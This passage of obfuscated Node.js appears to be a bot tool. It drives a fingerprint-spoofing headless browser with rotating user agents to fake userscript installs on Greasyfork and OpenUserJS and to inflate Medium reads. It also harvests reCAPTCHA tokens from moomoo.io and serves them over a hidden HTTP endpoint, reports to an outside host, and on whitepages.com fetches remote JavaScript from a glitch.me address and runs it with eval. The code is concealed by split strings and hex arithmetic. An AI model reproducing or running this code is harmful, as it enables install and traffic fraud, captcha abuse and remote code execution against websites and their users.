      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x3)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x9, 'xoLG') + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + a1(0x19) + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + Z(0x16, 'L6HJ') + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * 0xbc6 + -0x2022 + 0x4 * 0x517
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x4ba * -0x7 + 0x18d * -0x13 + -0x39f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x55 * -0x3f + 0x3 * -0x3a9 + 0x204a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x940 + 0x821 * 0x3 + -0x213f), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0x1a7e + -0x13 * 0x1b3 + 0x5cb;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xb2c * -0x2 + 0x13af + -0x2a07; w < getRandomInt(-0x5f4 + 0xfbd + -0x9c8, 0xc2f * 0x2 + 0xc7 * 0x2 + -0x15d * 0x13); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x12919 + 0xf7d3 + 0x1 * 0x11ba6);
        }
      }();
    }, -0xd47 + 0xcf3 + 0xb8 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x3 * -0x827 + -0x2356 * 0x1 + -0x5 * -0x22d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v[a2(0x18, 'c)SA')](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * -0x1804 + -0x3 * 0x90e + 0x1a * 0x1f, 0x2474 + 0x9a8 * -0x1 + 0x1c6 * -0xf)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x46d * 0x2f + -0x2e3 * 0x4c + 0x22097);
    }, -0x272 + -0x1cf6 + 0x1fcc), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x13a9 + -0x17a3 + 0x3fa;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x247a + -0xe29 + -0x139 * -0x33), await u['evaluate'](() => {
            const a3 = c;
            let v = new XMLHttpRequest();
            v['open']('GET', a3(0xe) + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x69b + -0xb3f * 0x2 + 0xfe3 * 0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xb * -0xfb41 + 0x2 * 0x7adab + 0x92c15);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x195e + -0x8c1 + 0x1d1 * 0x13);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x2448 * 0x1 + 0x23d * 0x7 + 0x1565);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3537 + -0x33d5 + 0x1e2e);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b,
    a5 = c;
  async function f() {
    const a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1543 * 0x1 + -0xd * -0x271 + -0xa79) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x7d8 * -0x2 + 0x5c * -0x39 + 0x4cd));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * 0x1912 + -0x29 * 0x7f + 0x2d69 * 0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0xa6d + 0x167 + 0x906, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x32f9 * -0x1 + 0x52f * -0x5 + -0x2 * -0x701),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x25c9 + 0xa27 + 0x42b2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z[a4(0x1d)], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + a5(0x6),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + a6(0x10, '&zCq') + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
